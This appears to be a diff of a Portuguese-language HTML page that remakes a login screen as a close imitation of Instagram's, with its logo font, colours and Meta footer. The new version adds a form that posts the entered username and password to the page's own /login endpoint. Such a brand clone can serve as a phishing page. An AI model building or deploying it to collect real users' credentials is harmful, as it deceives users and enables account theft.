@@ -4,6 +4,11 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Instagram</title>
+  <!-- Importando a fonte cursiva semelhante à do Instagram -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+
   <style>
     * {
       margin: 0;
@@ -13,323 +18,191 @@
     }
 
     body {
-      background-color: #0c0f14;
-      color: #ffffff;
+      background-color: #ffffff;
+      color: #262626;
+      display: flex;
+      flex-direction: column;
       min-height: 100vh;
-      display: flex;
-      flex-direction: column;
       justify-content: space-between;
-    }
-
-    .container {
-      display: flex;
-      flex: 1;
-      width: 100%;
-    }
-
-    /* Lado Esquerdo - Hero / Branding */
-    .left-section {
-      flex: 1.2;
-      display: flex;
-      flex-direction: column;
       align-items: center;
-      justify-content: center;
-      padding: 40px;
-      position: relative;
+      padding: 20px 0 0 0;
     }
 
-    .instagram-logo {
-      position: absolute;
-      top: 40px;
-      left: 60px;
-      width: 38px;
-      height: 38px;
-    }
-
-    .hero-title {
-      font-size: 3rem;
-      font-weight: 700;
-      text-align: center;
-      max-width: 500px;
-      line-height: 1.2;
-      margin-bottom: 40px;
-    }
-
-    .gradient-text {
-      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-
-    .cards-container {
-      position: relative;
-      width: 300px;
-      height: 420px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .mock-card {
-      position: absolute;
-      border-radius: 24px;
-      background-size: cover;
-      background-position: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-    }
-
-    .card-center {
-      width: 220px;
-      height: 380px;
-      background-image: url('https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=500&auto=format&fit=crop');
-      z-index: 2;
-      border: 2px solid rgba(255, 255, 255, 0.2);
-    }
-
-    .card-left {
-      width: 180px;
-      height: 320px;
-      background-image: url('https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=500&auto=format&fit=crop');
-      transform: rotate(-12deg) translateX(-80px);
-      z-index: 1;
-      opacity: 0.8;
-    }
-
-    .card-right {
-      width: 180px;
-      height: 320px;
-      background-image: url('https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=500&auto=format&fit=crop');
-      transform: rotate(12deg) translateX(80px);
-      z-index: 1;
-      opacity: 0.8;
-    }
-
-    /* Lado Direito - Formulário de Login */
-    .right-section {
-      flex: 0.8;
-      background-color: #12161f;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      padding: 40px;
-      border-left: 1px solid #1e2530;
-    }
-
-    .login-box {
+    .main-container {
       width: 100%;
       max-width: 350px;
       display: flex;
       flex-direction: column;
-      gap: 16px;
+      align-items: center;
+      padding: 0 40px;
+      margin: auto;
     }
 
-    .login-title {
-      font-size: 1.1rem;
-      font-weight: 600;
-      margin-bottom: 8px;
+    .instagram-logo {
+      font-family: 'Grand Hotel', cursive;
+      font-size: 3.8rem;
+      font-weight: 400;
+      margin: 36px 0 24px 0;
+      text-align: center;
+      color: #262626;
+    }
+
+    .login-form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .input-group {
+      position: relative;
+      width: 100%;
     }
 
     .input-field {
       width: 100%;
-      padding: 14px 16px;
-      background-color: #1c222e;
-      border: 1px solid #2a3242;
-      border-radius: 12px;
-      color: #ffffff;
-      font-size: 0.9rem;
+      padding: 12px 10px;
+      background-color: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 5px;
+      font-size: 0.85rem;
+      color: #262626;
       outline: none;
     }
 
-    .input-field::placeholder {
-      color: #8e9aaf;
+    .input-field:focus {
+      border-color: #a8a8a8;
     }
 
-    .input-field:focus {
-      border-color: #4a5568;
+    .input-field::placeholder {
+      color: #8e8e8e;
     }
 
     .btn-submit {
       width: 100%;
-      padding: 12px;
-      background-color: #00427c;
+      padding: 10px;
+      background-color: #0095f6;
       color: #ffffff;
       border: none;
-      border-radius: 20px;
-      font-weight: 600;
-      font-size: 0.95rem;
-      cursor: pointer;
-      margin-top: 4px;
-      opacity: 0.7;
-      transition: background-color 0.2s;
-    }
-
-    .btn-submit:hover {
-      opacity: 1;
-      background-color: #00569e;
-    }
-
-    .forgot-password {
-      text-align: center;
-      color: #ffffff;
-      text-decoration: none;
-      font-size: 0.85rem;
-      margin: 8px 0;
-    }
-
-    .btn-facebook {
-      width: 100%;
-      padding: 12px;
-      background-color: #1c222e;
-      color: #ffffff;
-      border: none;
-      border-radius: 20px;
+      border-radius: 8px;
       font-weight: 600;
       font-size: 0.9rem;
       cursor: pointer;
+      margin-top: 6px;
+    }
+
+    .btn-submit:hover {
+      background-color: #1877f2;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      width: 100%;
+      margin: 18px 0;
+    }
+
+    .divider-line {
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+
+    .divider-text {
+      padding: 0 18px;
+      color: #8e8e8e;
+      font-size: 0.8rem;
+      font-weight: 600;
+      text-transform: uppercase;
+    }
+
+    .fb-login {
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 8px;
-    }
-
-    .btn-create-account {
-      width: 100%;
-      padding: 12px;
-      background-color: transparent;
-      color: #0095f6;
-      border: 1px solid #0095f6;
-      border-radius: 20px;
+      color: #385185;
       font-weight: 600;
       font-size: 0.9rem;
-      cursor: pointer;
-      text-align: center;
       text-decoration: none;
+      margin-bottom: 12px;
     }
 
-    .meta-logo {
-      text-align: center;
-      margin-top: 24px;
-      color: #8e9aaf;
-      font-size: 0.85rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-    }
-
-    /* Rodapé */
-    footer {
-      padding: 20px 40px;
-      background-color: #0c0f14;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 12px;
+    .forgot-password {
+      color: #00376b;
       font-size: 0.75rem;
-      color: #8e9aaf;
+      text-decoration: none;
+      text-align: center;
+      margin-top: 12px;
     }
 
-    .footer-links {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 16px;
+    .signup-box {
+      width: 100%;
+      max-width: 350px;
+      padding: 20px;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      text-align: center;
+      font-size: 0.85rem;
+      color: #262626;
+      margin-bottom: 10px;
+      background-color: #ffffff;
     }
 
-    .footer-links a {
-      color: #8e9aaf;
+    .signup-box a {
+      color: #0095f6;
+      font-weight: 600;
       text-decoration: none;
     }
 
-    .footer-bottom {
-      display: flex;
-      gap: 16px;
-    }
-
-    @media (max-width: 900px) {
-      .container {
-        flex-direction: column;
-      }
-      .left-section {
-        display: none;
-      }
-      .right-section {
-        border-left: none;
-        flex: 1;
-      }
+    footer {
+      text-align: center;
+      font-size: 0.75rem;
+      color: #8e8e8e;
+      padding: 20px;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <!-- Lado Esquerdo -->
-    <div class="left-section">
-      <svg class="instagram-logo" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
-        <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
-        <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
-      </svg>
+  <div class="main-container">
+    <h1 class="instagram-logo">Instagram</h1>
 
-      <h1 class="hero-title">
-        Veja momentos do dia a dia dos seus <span class="gradient-text">amigos próximos.</span>
-      </h1>
-
-      <div class="cards-container">
-        <div class="mock-card card-left"></div>
-        <div class="mock-card card-right"></div>
-        <div class="mock-card card-center"></div>
+    <form class="login-form" action="/login" method="POST">
+      <div class="input-group">
+        <input type="text" class="input-field" name="username" placeholder="Telefone, nome de usuário ou e-mail" required />
       </div>
-    </div>
-
-    <!-- Lado Direito -->
-    <div class="right-section">
-      <div class="login-box">
-        <h2 class="login-title">Entrar no Instagram</h2>
-
-        <input type="text" class="input-field" placeholder="Número de celular, nome de usuário ou email" />
-        <input type="password" class="input-field" placeholder="Senha" />
-
-        <button class="btn-submit">Entrar</button>
-
-        <a href="#" class="forgot-password">Esqueceu a senha?</a>
-
-        <button class="btn-facebook">
-          <span>f</span> Entrar com o Facebook
-        </button>
-
-        <a href="#" class="btn-create-account">Criar nova conta</a>
-
-        <div class="meta-logo">
-          <span>∞ Meta</span>
-        </div>
+      <div class="input-group">
+        <input type="password" class="input-field" name="password" placeholder="Senha" required />
       </div>
-    </div>
+
+      <button type="submit" class="btn-submit">Entrar</button>
+
+      <div class="divider">
+        <div class="divider-line"></div>
+        <div class="divider-text">OU</div>
+        <div class="divider-line"></div>
+      </div>
+
+      <a href="#" class="fb-login">
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="#385185">
+          <path d="M12 2.04c-5.5 0-10 4.5-10 10 0 5 3.66 9.13 8.44 9.88v-6.99h-2.54v-2.89h2.54v-2.2c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.23.2 2.23.2v2.45h-1.25c-1.24 0-1.63.77-1.63 1.56v1.88h2.77l-.44 2.89h-2.33v6.98c4.78-.75 8.44-4.88 8.44-9.88 0-5.5-4.5-10-10-10z"/>
+        </svg>
+        Entrar com o Facebook
+      </a>
+
+      <a href="#" class="forgot-password">Esqueceu a senha?</a>
+    </form>
   </div>
 
-  <!-- Rodapé -->
+  <div class="signup-box">
+    Não tem uma conta? <a href="#">Cadastre-se.</a>
+  </div>
+
   <footer>
-    <div class="footer-links">
-      <a href="#">Meta</a>
-      <a href="#">Sobre</a>
-      <a href="#">Blog</a>
-      <a href="#">Carreiras</a>
-      <a href="#">Ajuda</a>
-      <a href="#">API</a>
-      <a href="#">Privacidade</a>
-      <a href="#">Termos</a>
-      <a href="#">Localizações</a>
-      <a href="#">Popular</a>
-      <a href="#">Instagram Lite</a>
-      <a href="#">Meta AI</a>
-      <a href="#">Threads</a>
-    </div>
-    <div class="footer-bottom">
-      <span>Português (Brasil) ˅</span>
-      <span>© 2026 Instagram from Meta</span>
-    </div>
+    <p>© 2026 Instagram from Meta</p>
   </footer>
+
   <script src="script.js"></script>
 </body>
 </html>
